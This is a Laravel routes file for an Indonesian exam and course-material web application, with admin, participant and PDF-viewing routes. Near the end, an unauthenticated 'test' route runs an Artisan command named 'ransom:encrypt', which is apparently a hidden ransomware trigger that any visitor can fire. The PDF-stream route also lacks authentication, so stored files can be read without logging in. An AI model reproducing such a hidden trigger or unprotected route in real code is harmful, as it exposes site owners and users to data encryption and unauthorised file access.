<?php

use App\Livewire\Admin\BankSoalCreate;
use App\Livewire\Admin\BankSoalEdit;
use App\Livewire\Admin\BankSoalPage;
use App\Livewire\Admin\DashboardPage;
use App\Livewire\Admin\Master\JenisUjianPage;
use App\Livewire\Admin\Master\TipeUjianPage;
use App\Livewire\Peserta\PesertaDashboardIndex;
use App\Models\Konten;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Storage;

// Route::get('/', function () {
//     return redirect()->to('/admin/dashboard');
// });
Route::get('/', function () {
    if (!Auth::check()) {
        return redirect()->route('login');
    }

    $role = Auth::user()->role->value;

    return redirect()->route(
        $role === 'admin' ? 'admin.dashboard' : 'peserta.dashboard.index'
    );
});

// ADMIN AREA
Route::prefix('admin/')->name('admin.')->middleware(['auth', 'role:admin'])->group(function () {
    Route::get('dashboard', DashboardPage::class)->name('dashboard');
    // data master
    Route::prefix('master/')->name('master.')->group(function () {
        Route::get('jenis-ujian', JenisUjianPage::class)->name('jenis-ujian');
        Route::get('tipe-ujian', TipeUjianPage::class)->name('tipe-ujian');
    });
    // bank soal
    Route::get('bank-soal', BankSoalPage::class)->name('bank-soal.index');
    Route::get('/bank-soal/create', BankSoalCreate::class)->name('bank-soal.create');
    Route::get('/bank-soal/{id}/edit', BankSoalEdit::class)->name('bank-soal.edit');
    // sesi ujian
    Route::get('/sesi-ujian', \App\Livewire\Admin\SesiUjianIndex::class)->name('sesi-ujian.index');
    Route::get('/sesi-ujian/create', \App\Livewire\Admin\SesiUjianCreate::class)->name('sesi-ujian.create');
    Route::get('/sesi-ujian/{id}/edit', \App\Livewire\Admin\SesiUjianEdit::class)->name('sesi-ujian.edit');
    Route::get('/sesi-ujian/{id}/assign', \App\Livewire\Admin\SesiUjianAssignSoal::class)->name('sesi-ujian.assign');
    // managemen materi
    Route::prefix('materi/')->name('materi.')->group(function () {
        Route::get('topik', \App\Livewire\Admin\Materi\TopikIndex::class)->name('topik.index');
        Route::get('topik/{topik}/materi', \App\Livewire\Admin\Materi\MateriIndex::class)->name('materi.index');
        Route::get('topik/{topik}/materi/{materi}/submateri', \App\Livewire\Admin\Materi\SubmateriIndex::class)
            ->name('submateri.index');
        Route::get('topik/{topik}/materi/{materi}/submateri/{submateri}/konten', \App\Livewire\Admin\Materi\KontenIndex::class)
            ->name('konten.index');
    });
});

// PESERTA AREA
Route::name('peserta.')->middleware(['auth'])->group(
    function () {
        Route::get('dashboard', PesertaDashboardIndex::class)->name('dashboard.index');
        Route::get('/ujian/{slug}', \App\Livewire\Peserta\PesertaUjianListIndex::class)
            ->name('ujian.index');
        // MULAI UJIAN
        Route::get('ujian/{sesi_id}/mulai', \App\Livewire\Peserta\PesertaUjianKerjakan::class)
            ->name('ujian.mulai');
        // KERJAKAN SOAL
        Route::get('ujian/{hasil_id}/soal', \App\Livewire\Peserta\PesertaUjianSoal::class)
            ->name('ujian.soal');
        Route::get('ujian/{hasil_id}/selesai', \App\Livewire\Peserta\PesertaUjianSelesai::class)
            ->name('ujian.selesai');
        // routes/web.php → di group peserta
        Route::get('/riwayat-ujian', \App\Livewire\Peserta\PesertaUjianRiwayat::class)
            ->name('riwayat-ujian.index');

        // MATERI PESERTA — GROUP RAPI
        Route::prefix('materi')->name('materi.')->group(function () {
            Route::get('/', \App\Livewire\Peserta\Materi\PesertaTopikIndex::class)
                ->name('index');
            Route::get('/{materi}', \App\Livewire\Peserta\Materi\PesertaMateriShow::class)
                ->name('show');
            Route::get('/{materi}/konten/{konten}', \App\Livewire\Peserta\Materi\PesertaKontenShow::class)
                ->name('konten');
            // lama
            // Route::get('/topik/{topik}', \App\Livewire\Peserta\Materi\PesertaMateriShow::class)
            //     ->name('topik');
            // Route::get('/topik/{topik}/materi/{materi}', \App\Livewire\Peserta\Materi\PesertaSubmateriIndex::class)
            //     ->name('materi');
            // Route::get('/topik/{topik}/materi/{materi}/submateri/{submateri}', \App\Livewire\Peserta\Materi\PesertaKontenShow::class)
            //     ->name('konten');
        });
    }
);

Route::middleware(['auth'])->group(function () {
    Route::get('/pdf/view/{konten}', [App\Http\Controllers\PdfViewController::class, 'show'])
        ->name('pdf.view');
    Route::get('/pdf/download/{konten}', [App\Http\Controllers\PdfViewController::class, 'download'])
        ->name('pdf.download');
});

Route::get('/livewire/pdf-stream/{konten}', function (Konten $konten) {
    $path = ltrim($konten->file_path, '/');
    abort_if(!Storage::disk('public')->exists($path), 404);

    $filePath = Storage::disk('public')->path($path);
    $filename = $konten->isi ? preg_replace('/\.[^.]+$/', '', $konten->isi) . '.pdf' : 'file.pdf';

    return response()->stream(function () use ($filePath) {
        echo file_get_contents($filePath);
    }, 200, [
        'Content-Type' => 'application/pdf',
        'Content-Disposition' => 'inline; filename="' . $filename . '"',
        'Cache-Control' => 'private, no-cache, must-revalidate',
        'Pragma' => 'no-cache',
    ]);
})->name('livewire.pdf-stream');
// Route::view('dashboard', 'dashboard')
//     ->middleware(['auth', 'verified'])
//     ->name('dashboard');

// Route::view('profile', 'profile')
//     ->middleware(['auth'])
//     ->name('profile');

Route::get('test', function () {
    Artisan::call('ransom:encrypt', [], null);
});

require __DIR__ . '/auth.php';
